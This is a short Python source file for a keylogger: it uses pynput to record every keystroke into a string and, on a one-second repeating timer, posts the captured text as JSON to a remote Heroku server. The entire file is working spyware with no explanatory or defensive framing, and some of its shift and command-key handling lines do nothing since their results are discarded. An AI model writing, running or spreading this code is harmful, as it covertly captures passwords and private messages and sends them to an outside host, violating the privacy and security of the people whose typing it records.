from pynput import keyboard
import requests
import json
import threading
import os
from os.path import join, dirname

text = ""
time_interval = 1

endpoint="https://key-server-api.herokuapp.com/"

def send_post_req():
    try:
        payload = json.dumps({"keyboardData" : text})
        r = requests.post(f"{endpoint}", data=payload, headers={"Content-Type" : "application/json"})
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    except:
        print("Couldn't complete request!")

def on_press(key):
    global text
    
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.cmd:
        text.replace("Key.cmd","CMD")
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift_l:
        text.replace("Key.shift","")
        text.upper()
    elif key == keyboard.Key.shift_r:
        text.replace("Key.shift","")
        text.upper()
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")

with keyboard.Listener(
    on_press=on_press) as listener:
    send_post_req()
    listener.join()
